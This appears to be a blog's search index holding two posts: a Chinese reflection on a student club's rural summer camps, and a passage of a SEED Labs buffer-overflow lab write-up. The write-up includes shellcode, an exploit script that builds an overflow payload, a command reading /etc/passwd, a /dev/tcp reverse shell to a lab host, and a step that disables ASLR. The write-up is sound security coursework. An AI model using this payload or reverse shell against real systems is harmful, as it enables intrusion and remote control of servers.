<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【活动思考】自强社乡村暑期夏令营——大学生寻找&quot;有用&quot;的另一种定义</title>
      <link href="/posts/5ffaf640.html"/>
      <url>/posts/5ffaf640.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>如果要问社团里不能错过的的一次志愿活动是什么，肯定会有一个回答是每年暑期下乡给乡村孩子们办的暑期夏令营活动。在这里，很多自强的小伙伴找到大学里另外一种&quot;有用&quot;的定义，看见社团十几年所传续的&quot;传递社会关爱&quot;精神，体会到乡村发展变迁中个人与国家的同频。</p></blockquote><span id="more"></span><h2 id="历史">历史</h2><blockquote><p>卢妈常说，社团与攀枝花盐边温泉乡小学的情谊，早在2010年就已经埋下了种子。</p></blockquote><p>2010年，西南五省，特大旱灾，百年一遇。社会优秀企业家通过中国扶贫基金会捐款两亿元人民币，救同胞于危难之中。为了准确、及时地将每户两千元的善款发放到受灾农户手中，四川大学支持中国扶贫基金会的工作，派遣以新长城四川大学自强社社员为主体的各学院、各年级共72名大学生志愿者前往重庆市巫溪县、四川凉山州甘洛县、四川攀枝花市盐边县开展受助农户信息复核和善款存折发放工作。</p><hr><p>在盐边，一位志愿者记录下他所看到的乡村教育现状：</p><h3 id="巧遇大学生——关注农村教育现状">巧遇大学生——关注农村教育现状</h3><p>2010年8月11、12日，我们小组的任务是核查盐边县温泉乡四呷左村的左红和左红岩，共59户受助农户的家庭情况。在这两天的行程中，我们最大的收获是遇见了一位准大学生，并从他那里了解到当地农村教育的现状。</p><p>两个小时的艰难跋涉后，我们终于到达了攀社长家，简单地吃了午饭后，我们开始挨家挨户核对受助农户信息。在前来领取存折的村民中，有一个年轻人引起了我们的注意。他大约19到20岁，皮肤黝黑，流着涔涔的汗，穿着一身篮球服，脚下却是一双拖鞋。</p><div class="note warning flat"><p>经交谈我们才知道他是一名准大学生，我们很惊喜，这是我们下乡以来所遇到的第一名大学生。</p></div><p>他腼腆又不失纯朴，虽然只字未提辛苦，只是单纯地叙述着自己的求学过程，但是我们从他的话里深刻地体会到了他和他家的艰苦。他家在山区，每次回家近校后都必须先坐一个半小时的车到盐边县里，再坐六个小时摩托车才能到学校，所以，他平时只有国庆、五一长假才能回一次家，然后又匆匆返校。第二天我们也亲身体验了一下坐摩托车的感觉，在这样的山路上，颠簸无时不在，时而打滑，时而涉水，师傅不得不用双脚辅助控制方向，说实话，心里不免紧张。两个小时后，一直抓紧的双手都麻木僵硬了……</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912368.png" alt="图片 1"></p><p>经过4个小时的奋斗顺利完成了四呷左村的农户信息核查工作后，下午四点，还没吃午饭的我们随着已经在一旁等候许久的红岩社攀社长，从四呷左村向左红岩社进发。山路陡峭难行，从四呷左到红岩，七八十度的陡坡，限行一人的傍山小路，杂草丛生的田坎，上山、下山……</p><blockquote><p>更令我们惊讶的是，整个左红岩社至今只有他一个大学生，这不由地让我们感叹身边普普通通的一名大学生在这里却是全社甚至全村的骄傲。</p><footer><strong>深刻的感悟</strong></footer></blockquote><p>在九年义务教育普及的年代，这里有很多孩子早早地辍学了，跟着父母在田里劳作，小小的手里握的不是纸和笔，而是镰刀与锄头。农村教育条件的低下和恶劣让多少学龄儿童不能走进教室，走出大山，只得沿袭着祖祖辈辈的农耕生活。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912411.png" alt="图片 2"></p><div class="note primary flat"><p>农村条件差与孩子不能接受更好的教育已经成为一种恶性循环。我们应该更加关注农村的教育现状，大力帮助农村发展教育，增加教育设备和教育力量，用知识发展农村，创建社会主义新农村。</p></div><p style="text-align: right; font-size: 0.9em; color: #999;">（图文：许海青 邓川川）</p><p>因为这份记录，社团关注到温泉乡的孩子们，与温泉彝族乡中心小学的钟贵平老师取得联系，并在此后，努力为学校的孩子们办起了一届又一届丰富多彩的乡村夏令营。</p><hr><h2 id="志愿者分享摘录">志愿者分享摘录</h2><h3 id="2016-·-川爱木棉队">2016 · 川爱木棉队</h3><blockquote><p>&quot;老师好！&quot;看到他们那么可爱， 听到他们响亮的回答和嘹亮的歌声，自己好像回到从前，回到中学时代。 看着他们那充满着渴望的双眼，听着他们那真稚的声音，自己有一种冲动，恨不得一下子把自己所有的知识都传授给他们。</p><footer><strong>全体同学都站起来高喊</strong></footer></blockquote><p>……</p><div class="note success flat"><p>半个月，也许有些漫长，但对志愿者而言每一天的每一分、每一秒都弥足珍贵。</p><p>十五天，又是那样短暂，想要带给他们的还有那么多，刚刚熟悉了彼此就要离开。</p><p>孩子们和志愿者一起上课虽是师生却更是朋友，有时志愿者会训斥孩子的顽劣却更害怕会伤害他们那幼小的心灵。</p><p>山路一弯又一弯，一道道封存着这份珍贵时光，短暂又充满深思意味…</p><p>今后会有更多优秀的川大自强社志愿者来到这里，必将带给他们更多祝福，这份祝福将会一直延续。</p></div><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912449.png" alt="图片 3"></p><hr><h3 id="2017-·-木棉星火队">2017 · 木棉星火队</h3><p>下午，志愿者们组织了几个小分队分别送学生回家并进行简单的家访。在学生的带领下，志愿者们踏上了环绕山间的小路。一路上，河水潺潺，鸟鸣清脆，绿树葱葱。学生给志愿者介绍家里的经济情况以及当地的一些交通情况。八月，温泉彝族乡的太阳没有白云遮挡，显得格外炙热。志愿者和学生一行五人，走在杂草丛生的山路上，倾斜的上坡让志愿者们汗流浃背甚至有些体力不支。将近两个小时的山路，学生与志愿者愉快交谈，说着他的童年上学路。这条路，志愿者是第一次走，而对于学生来说却是一条承载梦想和童年的求学路。</p><p>到了学生的家中，志愿者们看到了简陋的棚子、仅有的一些家具、刚修好的房子和那个无依无靠的火堆。和学生的家长交流后，志愿者们了解到了学生的家庭情况和经济来源。家访结束后，志愿者们再次踏上了那条孩子们的童年路。</p><blockquote><p>它是阳光，它是梦幻，是家长温暖的手臂爱抚。最难忘孩子们童年的路。</p><footer><strong>世上的路有无数</strong></footer></blockquote><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912488.png" alt="图片 4"></p><hr><h3 id="2018-·-春泉队">2018 · 春泉队</h3><div class="note info flat"><p>支教老师，班主任，大姐姐，这些称谓是责任和爱心编织的头冠，唯有用心顶起，才不负孩子们的信任和期待。</p></div><p>写此文时，山里寂静，十一点左右，窗外的温泉河响声越发清亮了。收拾东西回宿舍，才发现外面下着雨。或许青春就是一场心甘情愿被淋湿的雨，即使感冒了，也义无反顾。</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912523.png" alt="图片 6"></p><hr><h3 id="2019-·-夏花队">2019 · 夏花队</h3><p>7月21日是一个特别的日子，恰逢温泉彝族乡隆重庆祝火把节。晨练后，志愿者帮当地村民一同为庆祝活动做准备，并参与篮球赛、拔河比赛和文艺汇演等活动，在过程中深入感受到彝族浓厚的民族特色和风土人情。志愿者们惊喜编排的节目舞蹈&lt;&lt;爱&gt;&gt;，为火把节注入特别的川大元素，收获了彝族同胞的掌声和好评。最后的大联欢篝火晚会，志愿者和彝族同胞们围着篝火，手拉手同歌共舞，难忘今宵!</p><div class="note success flat"><p>当享受于和孩子们的嬉戏打闹、同学们充满求知欲的眼神、火把节的快乐时光，登山时的惊险刺激时，时间在悄悄地溜走。当发现已到分别时刻，恋恋不舍时，时间还在不停地奔跑。</p><p>别了，孩子们；别了，温泉乡；别了，攀枝花；别了，夏令营。虽有遗憾，但回想起来，今天终是一次圆满地告别。</p></div><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912564.png" alt="图片 5"></p><hr><h3 id="2020-2022-·-抗疫时期">2020-2022 · 抗疫时期</h3><p>由于疫情原因，社团通过向阳花与温泉小学的孩子们保持联系。</p><hr><h3 id="2023-·-泉涌小队">2023 · 泉涌小队</h3><p>从一开始站上讲台的忐忑不安到现在的从容自如，与孩子们从陌生到不经意间收获他们的一个拥抱、一幅画、几粒花生、一个花环，家访途中受伤的志愿者被孩子们轻轻敷上的草药彻底治愈。</p><div class="note primary flat"><p>心中有&quot;十万个为什么&quot;的孩子们回家途中捡拾垃圾、书包一放就上山打猪草让志愿者格外动容。志愿者格外感恩和珍惜这一段与孩子们在一起的美好记忆。</p></div><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912604.png" alt="图片 7"></p><hr><h3 id="2024-·-夏日童乐暖阳队">2024 · 夏日童乐暖阳队</h3><p>他们在诗里描绘自己的未来，&quot;飘到各个地方去&quot;想必早已传达了他们想走出大山看看外人的世界，看看我们这群来自外地的大哥哥大姐姐生活的世界是怎样的想法。</p><p>我不止一瞬间感到惋惜，惋惜他们的出生，惋惜和我所有乡村儿童的出生，但又感到庆幸，他们的无忧无虑，他们对外界充满着向往。</p><blockquote><p>他们同时又是有个性的，或沉静温柔，或热烈大方，他们有自己的人格和底色，会想通过自己的努力过好自己的独特人生，我所看到的他们好像还没有棱角，对自己的未来充满希望。</p><footer><strong>独特的个性</strong></footer></blockquote><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912639.png" alt="图片 9"></p><hr><h3 id="2025-·-灯火同辉队">2025 · 灯火同辉队</h3><p>夏蝉鸣声渐歇，微风拂过衣角，属于这个夏天的欢乐时光告一段落。7月29日上午十点，在志愿者精心准备下，&quot;灯火同辉&quot;小队顺利举办了此次夏令营活动的结营仪式。</p><div class="note success flat"><p>钟贵平老师的感谢里，藏着对这份青春助力的珍视，勉励小朋友们以川大为灯塔，<strong>心中有路，眼里有光，一路前行</strong>。</p><p>张晓旺队长的发言中，表达出对小朋友们的不舍与期待，期待小朋友们以**&quot;被看见&quot;的勇气**、<strong>&quot;被相信&quot;的力量</strong>和**&quot;我可以&quot;的底气**，走出大山，拥抱多彩的世界。</p></div><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260116222912681.png" alt="图片 8"></p>]]></content>
      
      
      <categories>
          
          <category> 社团活动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 致远分社 </tag>
            
            <tag> 活动记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Seed-Labs 2.0】Buffer-Overflow Attack</title>
      <link href="/posts/2f8e1b3a.html"/>
      <url>/posts/2f8e1b3a.html</url>
      
        <content type="html"><![CDATA[<h1>【Seed-Labs 2.0】Buffer-Overflow Attack</h1><p>本文为实验的复现，原文为：<a href="https://blog.ch3nyang.top/post/seedlab_buffer_overflow/">Ch3nyang’s blog | SEEDLabs (1) -Buffer-Overflow Attack</a></p><p>本文为 <a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Server/">SEED Labs 2.0 - Buffer-Overflow Attack Lab (Server Version)</a> 的实验记录。</p><h2 id="实验原理">实验原理</h2><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000940675.png" alt="image-20260106000840655"></p><h2 id="Task1-Get-Familiar-with-the-Shellcode">Task1: Get Familiar with the Shellcode</h2><p>进入 <code>shellcode</code> 文件夹。</p><blockquote><p><strong>Task.</strong> Please modify the shellcode, so you can use it to delete a file. Please include your modified the shellcode in the lab report, as well as your screenshots.</p></blockquote><p>根据 Task 的要求，我们对 <code>shellcode_32.py</code> 进行修改，使其能够删除文件。</p><p>需要注意的是，shell 长度不能变。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">s<span class="attr">hellcode</span> <span class="operator">=</span> (</span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>eb<span class="char escape_">\x</span>29<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>09<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>0c<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>47<span class="char escape_">\x</span>89<span class="char escape_">\x</span>5b&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0a<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>4c<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0d<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>50<span class="char escape_">\x</span>89<span class="char escape_">\x</span>43<span class="char escape_">\x</span>54&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>b0<span class="char escape_">\x</span>0b<span class="char escape_">\x</span>cd<span class="char escape_">\x</span>80<span class="char escape_">\x</span>e8<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff&quot;</span></span><br><span class="line">    <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">    <span class="string">&quot;_C*&quot;</span></span><br><span class="line">    <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">    <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">    <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">    <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">    <span class="comment"># so the command string ends here.</span></span><br><span class="line">    <span class="comment"># You can delete/add spaces, if needed, to keep the position the same.</span></span><br><span class="line">    <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">    <span class="string">&quot;/bin/rm -f tmpfile; echo Hello 32;                        *&quot;</span></span><br><span class="line">    <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] -- &gt; &quot;/bin/bash&quot;</span></span><br><span class="line">    <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] -- &gt; &quot;-c&quot;</span></span><br><span class="line">    <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] -- &gt; the command string</span></span><br><span class="line">    <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] -- &gt; NULL</span></span><br><span class="line">).encode(&#x27;latin-<span class="number">1</span>&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="attr">content</span> <span class="operator">=</span> bytearray(<span class="number">200</span>)</span><br><span class="line">content[<span class="number">0</span>:] <span class="operator">=</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the binary code to file</span></span><br><span class="line"><span class="keyword">with</span> open(&#x27;codefile_32&#x27;, &#x27;wb&#x27;) as <span class="params">f:</span></span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>然后我们新建 <code>tmpfile</code> 文件并运行 shellcode，过程和结果如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>touch tmpfile</span><br><span class="line"><span class="variable">$ </span>./shellcode_32.py</span><br><span class="line"><span class="variable">$ </span>./shellcode_64.py</span><br><span class="line"><span class="variable">$ </span>make</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line"><span class="variable">$ </span>a32.out</span><br><span class="line"><span class="title class_">Hello</span> <span class="number">32</span></span><br><span class="line"><span class="variable">$ </span>a64.out</span><br><span class="line">total <span class="number">64</span></span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed   <span class="number">160</span> <span class="title class_">Dec</span> <span class="number">22</span>  <span class="number">2020</span> <span class="title class_">Makefile</span></span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed   <span class="number">312</span> <span class="title class_">Dec</span> <span class="number">22</span>  <span class="number">2020</span> <span class="variable constant_">README</span>.md</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> seed seed <span class="number">15740</span> <span class="title class_">Jul</span> <span class="number">10</span> 09<span class="symbol">:</span><span class="number">35</span> a32.out</span><br><span class="line">-rwxrwxr-x <span class="number">1</span> seed seed <span class="number">16888</span> <span class="title class_">Jul</span> <span class="number">10</span> 09<span class="symbol">:</span><span class="number">35</span> a64.out</span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed   <span class="number">476</span> <span class="title class_">Dec</span> <span class="number">22</span>  <span class="number">2020</span> call_shellcode.c</span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed   <span class="number">136</span> <span class="title class_">Jul</span> <span class="number">10</span> 09<span class="symbol">:</span><span class="number">34</span> codefile_32</span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed   <span class="number">165</span> <span class="title class_">Jul</span> <span class="number">10</span> 09<span class="symbol">:</span><span class="number">34</span> codefile_64</span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed  <span class="number">1221</span> <span class="title class_">Jul</span> <span class="number">10</span> 09<span class="symbol">:</span><span class="number">34</span> shellcode_32.py</span><br><span class="line">-rw-rw-r-- <span class="number">1</span> seed seed  <span class="number">1295</span> <span class="title class_">Dec</span> <span class="number">22</span>  <span class="number">2020</span> shellcode_64.py</span><br><span class="line"><span class="title class_">Hello</span> <span class="number">64</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> <span class="title class_">Core</span> <span class="title class_">Dumper</span><span class="symbol">:/</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">telnetd:</span><span class="symbol">x:</span><span class="number">126</span><span class="symbol">:</span><span class="number">134</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="symbol">x:</span><span class="number">127</span><span class="symbol">:</span><span class="number">135</span><span class="symbol">:ftp</span> daemon,,,<span class="symbol">:/srv/ftp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">128</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000940836.png" alt="image-20260105212632498"></p><p>执行完后，<code>tmpfile</code> 也被删除了。</p><h2 id="Task-2-Level-1-Attack">Task 2: Level-1 Attack</h2><p>首先关闭 address randomization countermeasure</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.<span class="attribute">randomize_va_space</span>=0</span><br></pre></td></tr></table></figure><p>进入 <code>server-code</code> 文件夹下，执行命令</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure><p>然后返回其根目录，执行命令启动 docker</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dcbuild</span></span><br><span class="line"><span class="attribute">dcup</span></span><br></pre></td></tr></table></figure><p>这里花了很多时间</p><p>进入 <code>attack-code</code> 文件夹，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> hello | nc 10.9.0.5 9090</span></span><br><span class="line">^C</span><br></pre></td></tr></table></figure><p>server 显示</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000940880.png" alt="image-20260105222847509"></p><p>我们修改 <code>exploit.py</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can use this shellcode to run any command you want</span></span><br><span class="line">s<span class="attr">hellcode</span> <span class="operator">=</span> (</span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>eb<span class="char escape_">\x</span>29<span class="char escape_">\x</span>5b<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>09<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>0c<span class="char escape_">\x</span>88<span class="char escape_">\x</span>43<span class="char escape_">\x</span>47<span class="char escape_">\x</span>89<span class="char escape_">\x</span>5b&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>48<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0a<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>4c<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>0d<span class="char escape_">\x</span>89<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>50<span class="char escape_">\x</span>89<span class="char escape_">\x</span>43<span class="char escape_">\x</span>54&quot;</span></span><br><span class="line">    <span class="string">&quot;<span class="char escape_">\x</span>8d<span class="char escape_">\x</span>4b<span class="char escape_">\x</span>48<span class="char escape_">\x</span>31<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>31<span class="char escape_">\x</span>c0<span class="char escape_">\x</span>b0<span class="char escape_">\x</span>0b<span class="char escape_">\x</span>cd<span class="char escape_">\x</span>80<span class="char escape_">\x</span>e8<span class="char escape_">\x</span>d2<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff<span class="char escape_">\x</span>ff&quot;</span></span><br><span class="line">    <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">    <span class="string">&quot;_C*&quot;</span></span><br><span class="line">    <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">    <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">    <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">    <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">    <span class="comment"># so the command string ends here.</span></span><br><span class="line">    <span class="comment"># You can delete/add spaces, if needed, to keep the position the same.</span></span><br><span class="line">    <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">    <span class="string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 4 /etc/passwd     *&quot;</span></span><br><span class="line">    <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] -- &gt; &quot;/bin/bash&quot;</span></span><br><span class="line">    <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] -- &gt; &quot;-c&quot;</span></span><br><span class="line">    <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] -- &gt; the command string</span></span><br><span class="line">    <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] -- &gt; NULL</span></span><br><span class="line">).encode(&#x27;latin-<span class="number">1</span>&#x27;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">c<span class="attr">ontent</span> <span class="operator">=</span> bytearray(<span class="number">0</span>x90 for i <span class="keyword">in</span> range(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">s<span class="attr">tart</span> <span class="operator">=</span> <span class="number">517</span> <span class="operator">-</span> len(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start <span class="operator">+</span> len(shellcode)] <span class="operator">=</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value</span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">r<span class="attr">et</span> <span class="operator">=</span> <span class="number">0</span>xffffd438 <span class="operator">+</span> <span class="number">8</span>      <span class="comment"># Change this number</span></span><br><span class="line">o<span class="attr">ffset</span> <span class="operator">=</span> <span class="number">116</span>              <span class="comment"># Change this number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset <span class="operator">+</span> <span class="number">4</span>] <span class="operator">=</span> (ret).to_bytes(<span class="number">4</span>,byteorder<span class="operator">=</span>&#x27;little&#x27;)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> open(&#x27;badfile&#x27;, &#x27;wb&#x27;) as <span class="params">f:</span></span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure><p>其中，</p><ul><li>shellcode 即为刚刚 <code>shellcode_32.py</code> 中的 shellcode</li><li>ret=ebp+n<ul><li><code>ebp</code> 就是刚刚 <code>echo hello</code> 中得到的 <code>ebp</code>，因为关闭了地址随机化，所以每次都一样</li><li>(n) 只要大于等于 (8) 都可以</li></ul></li><li>offset=0xffffd0e8-0xffffd078+4（其实就是116）</li></ul><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./exploit.py</span><br><span class="line"><span class="built_in">cat</span> badfile | nc 10.9.0.5 9090</span><br></pre></td></tr></table></figure><p>得到了结果</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000940931.png" alt="image-20260105225341495"></p><blockquote><p><strong>Reverse shell.</strong> Please modify the command string in your shellcode, so you can get a reverse shell on the target server. Please include screenshots and explanation in your lab report.</p></blockquote><p>根据 Task 要求，我们将 shellcode 改为 reverse shell，即第 10 行改为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.9.0.1/9090 0&gt;&amp;1 2&gt;&amp;1          *&quot;</span></span><br></pre></td></tr></table></figure><p>启动新 terminal ，执行监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnv <span class="number">9090</span></span><br></pre></td></tr></table></figure><p>在原来的 terminal 中再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./exploit.py</span><br><span class="line"><span class="built_in">cat</span> badfile | nc 10.9.0.5 9090</span><br></pre></td></tr></table></figure><p>可以看到获得了权限</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20260106000940989.png" alt="image-20260105230123636"></p><h2 id="Task-3-Level-2-Attack">Task 3: Level-2 Attack</h2><p>本 task 重点在于处理不知道大小的 buffer。</p><p>解决方法很简单：不知道 offset，那就挨个试一遍。</p><p>同样的，我们先 <code>echo hello</code></p><figure class="highlight subunit"><table><tr><td 